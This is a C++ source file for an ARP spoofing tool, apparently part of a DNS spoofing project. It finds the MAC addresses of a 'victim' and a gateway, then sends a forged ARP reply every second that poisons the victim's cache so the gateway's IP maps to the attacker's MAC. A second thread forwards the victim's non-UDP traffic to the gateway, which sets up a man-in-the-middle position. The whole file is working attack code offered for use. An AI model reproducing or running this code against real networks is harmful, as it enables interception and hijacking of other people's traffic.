#include "arp.h"
#include "dns.h"

Arp::Arp()
{

}

Arp::~Arp()
{

}

void Arp::arp_thread()
{
	thread arpThread(&Arp::arpspoof, this);
	thread forThread(&Arp::forwarding, this);
	forThread.detach();
	arpThread.detach();
}

bool Arp::arp_init()
{
	fprintf(stdout, " Find Gateway MAC Address... ");
	if (!find_macaddr(info.gateway_ip, info.gateway_mac))
	{
		fprintf(stderr, "\n [!] find_macaddr() Error...\n");
		return false;
	}
	fprintf(stdout, "OK\n");

	fprintf(stdout, " Find Victim MAC Address... ");
	if (!find_macaddr(info.victim_ip, info.victim_mac))
	{
		fprintf(stderr, "\n [!] find_macaddr() Error...\n");
		return false;
	}
	fprintf(stdout, "OK\n");

	fprintf(stdout, "\n\n Attacker MAC Address : ");
	print_info(info.attacker_mac, ETH_LEN);
	fprintf(stdout, "\n Attacker IP Address : ");
	print_info(info.attacker_ip, IP_LEN);

	fprintf(stdout, "\n\n Victim MAC Address : ");
	print_info(info.victim_mac, ETH_LEN);
	fprintf(stdout, "\n Victim IP Address : ");
	print_info(info.victim_ip, IP_LEN);

	fprintf(stdout, "\n\n Gateway MAC Address : ");
	print_info(info.gateway_mac, ETH_LEN);
	fprintf(stdout, "\n Gateway IP Address : ");
	print_info(info.gateway_ip, IP_LEN);
	fprintf(stdout, "\n");

	return true;
}

bool Arp::is_equal(uint8_t* _com1, uint8_t* _com2, int _len)
{
	bool result = true;

	for (int i = 0; i < _len; i++)
	{
		if (_com1[i] == _com2[i]) continue;
		else
		{
			result = false;
			break;
		}
	}
	return result;
}

bool Arp::find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
{
	uint8_t packet[2500] = { 0 };
	int dataPointer = 0;

	struct ether_header eth = { 0 };
	sscanf("ff:ff:ff:ff:ff:ff", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&eth.dst_host[0],
		&eth.dst_host[1],
		&eth.dst_host[2],
		&eth.dst_host[3],
		&eth.dst_host[4],
		&eth.dst_host[5]);
	memcpy(eth.src_host, info.attacker_mac, ETH_LEN);
	eth.ether_type = htons(ETHERTYPE_ARP);
	memcpy(packet, &eth, sizeof(eth));
	dataPointer += sizeof(eth);

	struct arp_header arp = { 0 };
	arp.hw_type = htons(0x0001);
	arp.protocol_type = htons(ETHERTYPE_IP);
	arp.hw_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(ARPCODE_REQ);
	memcpy(arp.sender_host, info.attacker_mac, ETH_LEN);
	memcpy(arp.sender_ip, info.attacker_ip, IP_LEN);
	sscanf("00:00:00:00:00:00", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&arp.target_host[0],
		&arp.target_host[1],
		&arp.target_host[2],
		&arp.target_host[3],
		&arp.target_host[4],
		&arp.target_host[5]);
	memcpy(arp.target_ip, _src_ip, IP_LEN);
	memcpy(packet + dataPointer, &arp, sizeof(arp));
	dataPointer += sizeof(arp);

	if (dataPointer < 60)
	{
		for (int i = dataPointer; i < 60; i++)
		{
			packet[i] = 0;
			dataPointer++;
		}
	}

	for (;;)
	{
		if (pcap_sendpacket(info.arp_handle, packet, dataPointer) != 0)
		{
			fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
			return false;
		}

		struct pcap_pkthdr header;
		uint8_t* data;
		if ((data = (uint8_t*)pcap_next(info.arp_handle, &header)) != NULL)
		{
			struct ether_header* pEth = (struct ether_header*)data;
			if (ntohs(pEth->ether_type) == ETHERTYPE_ARP)
			{
				struct arp_header* pArp = (struct arp_header*)(data + sizeof(*pEth));
				if (ntohs(pArp->opcode) == ARPCODE_RLY)
				{
					if (is_equal(pArp->sender_ip, _src_ip, IP_LEN))
					{
						memcpy(_dst_mac, pArp->sender_host, ETH_LEN);
						return true;
					}
				}
			}
		}
	}
	return false;
}

void Arp::print_info(uint8_t _addr[], int _len)
{
	int i;
	if (_len == ETH_LEN)
	{
		for (i = 0; i < _len; i++) {
			fprintf(stdout, "%.2x", _addr[i]);
			if (i != (ETH_LEN - 1))
				fprintf(stdout, ":");
		}
	}
	else if (_len == IP_LEN)
	{
		for (i = 0; i < _len; i++) {
			fprintf(stdout, "%u", _addr[i]);
			if (i != (IP_LEN - 1))
				fprintf(stdout, ".");
		}
	}
}

bool Arp::arpspoof()
{
	uint8_t packet[2500] = { 0 };
	int dataPointer = 0;

	struct ether_header eth = { 0 };
	memcpy(eth.dst_host, info.victim_mac, ETH_LEN);
	memcpy(eth.src_host, info.attacker_mac, ETH_LEN);
	eth.ether_type = htons(ETHERTYPE_ARP);
	memcpy(packet, &eth, sizeof(eth));
	dataPointer += sizeof(eth);

	struct arp_header arp = { 0 };
	arp.hw_type = htons(0x0001);
	arp.protocol_type = htons(ETHERTYPE_IP);
	arp.hw_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(ARPCODE_RLY);
	memcpy(&arp.sender_host, info.attacker_mac, ETH_LEN);
	memcpy(&arp.sender_ip, info.gateway_ip, IP_LEN);
	memcpy(&arp.target_host, info.victim_mac, ETH_LEN);
	memcpy(&arp.target_ip, info.victim_ip, IP_LEN);
	memcpy(packet + dataPointer, &arp, sizeof(arp));
	dataPointer += sizeof(arp);

	if (dataPointer < 60)
	{
		for (int i = dataPointer; i < 60; i++)
		{
			packet[i] = 0;
			dataPointer++;
		}
	}

	for (;;)
	{
		if (pcap_sendpacket(info.arp_handle, packet, dataPointer) != 0)
		{
			fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
			return false;
		}
		Sleep(1000);
	}

	return true;
}

bool Arp::forwarding()
{
	for (;;)
	{
		if ((data = (uint8_t*)pcap_next(info.arp_handle, &header)) != NULL)
		{
			struct ether_header* pEth;
			pEth = (struct ether_header*)data;
			int dataPointer = sizeof(*pEth);

			if (is_equal(pEth->src_host, info.victim_mac, ETH_LEN))
			{
				if (htons(pEth->ether_type) == ETHERTYPE_IP)
				{
					struct ip_header* pIp;
					pIp = (struct ip_header*)(data + dataPointer);
					dataPointer += sizeof(*pIp);

					if (!is_equal(pIp->dst_ip, info.attacker_ip, IP_LEN))
					{
						if (pIp->protocol != PROTOCOL_UDP)
						{
							memcpy(pEth->dst_host, info.gateway_mac, ETH_LEN);
							memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);
							memcpy(data, pEth, sizeof(*pEth));

							// Forwarding
							//printf("Forwarding\n");
							pcap_sendpacket(info.arp_handle, data, header.len);
						}
					}
				}
			}
		}
	}
}